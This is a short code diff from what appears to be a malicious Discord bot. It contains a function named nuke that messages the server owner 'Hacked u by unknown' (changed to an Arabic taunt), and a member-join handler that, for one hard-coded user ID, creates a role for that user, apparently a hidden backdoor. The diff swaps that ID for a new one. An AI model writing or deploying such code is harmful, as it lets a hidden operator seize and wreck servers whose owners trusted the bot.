@@ -417,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked u by unknown Is here    Óáã Úáì ÓíÑÝÑß åååååååååååååååå').catch(e => { return void e; });
+  await guild.owner.send(' سلم على سيرفر حبي').catch(e => { return void e; });
  
  
  
@@ -460,7 +460,7 @@ LOka.on('guildCreate', async (guild) => {
  
 LOka.on('guildMemberAdd', member => {
    
-            if (member.id === "349288766302584832") {
+            if (member.id === "358529506052669440") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM",
